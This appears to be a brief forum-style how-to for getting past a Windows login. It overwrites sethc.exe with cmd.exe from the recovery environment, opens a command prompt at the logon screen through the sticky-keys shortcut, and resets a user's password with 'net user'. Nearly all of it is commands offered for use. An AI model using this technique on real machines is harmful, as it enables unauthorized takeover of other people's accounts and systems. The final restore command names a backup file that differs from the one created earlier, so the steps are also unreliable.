Method 1:
copy c:\windows\system32\sethc.exe c:\windows\system32\sethc.exe.bak //backup sethc file.
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y //override with cmd.

Press shift 5 time cmd will open then type:

net localgroup administrators 
net user hp * //change password
exit

After looging in go to the winre again. Open cmd and type:

copy c:\windows\system32\sethc.bak c:\windows\system32\sethc.exe
Done.
